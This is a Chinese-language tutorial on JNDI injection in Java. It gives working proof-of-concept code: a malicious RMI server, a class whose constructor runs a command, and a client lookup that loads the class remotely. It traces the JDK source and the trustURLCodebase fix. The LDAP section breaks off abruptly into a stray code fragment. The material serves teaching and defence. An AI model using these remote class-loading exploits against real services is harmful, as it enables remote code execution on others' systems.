# JNDI
JNDI（全称`Java Naming and Directory Interface`）是用于目录服务的Java
API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。与与主机系统接口的所有Java
api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。
# JNDI注入
`JNDI`注入简单来说就是在`JNDI`接口在初始化时，如：`InitialContext.lookup(URI)`，如果URI可控，那么客户端就可能会被攻击
# RMI
通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个`Reference`对象，`Reference`对象中指定从远程加载构造的恶意`Factory`类，客户端在进行`lookup`的时候，会从远程动态加载攻击者构造的恶意`Factory`类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。
`javax.naming.Reference`构造方法为：`Reference(String className, String factory,
String factoryLocation)`，
  1. `className` \- 远程加载时所使用的类名
  2. `classFactory` \- 加载的`class`中需要实例化类的名称
  3. `classFactoryLocation` \- 提供`classes`数据的地址可以是`file/ftp/http`等协议
因为`Reference`没有实现`Remote`接口也没有继承`UnicastRemoteObject`类，故不能作为远程对象bind到注册中心，所以需要使用`ReferenceWrapper`对`Reference`的实例进行一个封装。
服务端代码如下：
    package demo;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import javax.naming.Reference;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RMIServer {
        public static void main(String[] args) throws Exception{
            Registry registry= LocateRegistry.createRegistry(7777);
            Reference reference = new Reference("test", "test", "http://localhost/");
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("calc", wrapper);
        }
    }
恶意代码（`test.class`），将其编译好放到可访问的`http`服务器
    import java.lang.Runtime;
    public class test{
        public test() throws Exception{
            Runtime.getRuntime().exec("calc");
        }
    }
当客户端通过`InitialContext().lookup("rmi://127.0.0.1:7777/calc")`获取远程对象时，会执行我们的恶意代码
    package demo;
    import javax.naming.InitialContext;
    public class JNDI_Test {
        public static void main(String[] args) throws Exception{
            new InitialContext().lookup("rmi://127.0.0.1:7777/calc");
        }
    }
其调用栈如下：
    getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
    getObjectInstance:319, NamingManager (javax.naming.spi)
    decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:411, InitialContext (javax.naming)
    main:7, JNDI_Test (demo)
前面的那几步是获取上下文信息的这里不过多展开，主要讲关键那几步。跟进`com.sun.jndi.rmi.registry.RegistryContext#decodeObject`，这里是将从服务端返回的`ReferenceWrapper_Stub`获取`Reference`对象。
    private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }
跟进`javax.naming.spi.NamingManager#getObjectInstance`，此处为获取`Factory`类的实例。
    public static Object
        getObjectInstance(Object refInfo, Name name, Context nameCtx,
                          Hashtable environment)
        throws Exception
    {
        ObjectFactory factory;
        //省略部分代码
        Object answer;
        if (ref != null) {
            String f = ref.getFactoryClassName();
            if (f != null) {
                // if reference identifies a factory, use exclusively
                factory = getObjectFactoryFromReference(ref, f);
                if (factory != null) {
                    return factory.getObjectInstance(ref, name, nameCtx,
                                                     environment);
                }
                // No factory found, so return original refInfo.
                // Will reach this point if factory class is not in
                // class path and reference does not contain a URL for it
                return refInfo;
            } else {
                // if reference has no factory, check for addresses
                // containing URLs
                answer = processURLAddrs(ref, name, nameCtx, environment);
                if (answer != null) {
                    return answer;
                }
            }
        }
        // try using any specified factories
        answer =
            createObjectFromFactories(refInfo, name, nameCtx, environment);
        return (answer != null) ? answer : refInfo;
    }
跟进`javax.naming.spi.NamingManager#getObjectFactoryFromReference`，此处`clas =
helper.loadClass(factoryName);`尝试从本地加载`Factory`类，如果不存在本地不存在此类，则会从`codebase`中加载：`clas
= helper.loadClass(factoryName,
codebase);`会从远程加载我们恶意class，然后在`return`那里`return (clas != null) ?
(ObjectFactory) clas.newInstance() : null;`对我们的恶意类进行一个实例化，进而加载我们的恶意代码。
    static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class clas = null;
        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.
        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }
        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
`com.sun.naming.internal.VersionHelper12#loadClass`具体代码如下，可以看到他是通过`URLClassLoader`从远程动态加载我们的恶意类。
    public Class loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                 URLClassLoader.newInstance(getUrlArray(codebase), parent);
        return loadClass(className, cl);
    }
对于这种利用方式Java在其`JDK
6u132、7u122、8u113`中进行了限制，`com.sun.jndi.rmi.object.trustURLCodebase`默认值变为`false`
    static {
        PrivilegedAction var0 = () -> {
            return System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
        };
        String var1 = (String)AccessController.doPrivileged(var0);
        trustURLCodebase = "true".equalsIgnoreCase(var1);
    }
如果从远程加载则会抛出异常
    if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
        throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
    }
    Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at demo.JNDI_Test.main(JNDI_Test.java:7)
# LDAP
`LDAP`，全称`Lightweight Directory Access
Protocol`，即轻量级目录访问协议，和Windows域中的`LDAP`概念差不多，这里就不进行过多展开了。
## JDK  0 ) {
                    cbstring = cbstring.substring(0, refPos);
                }
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));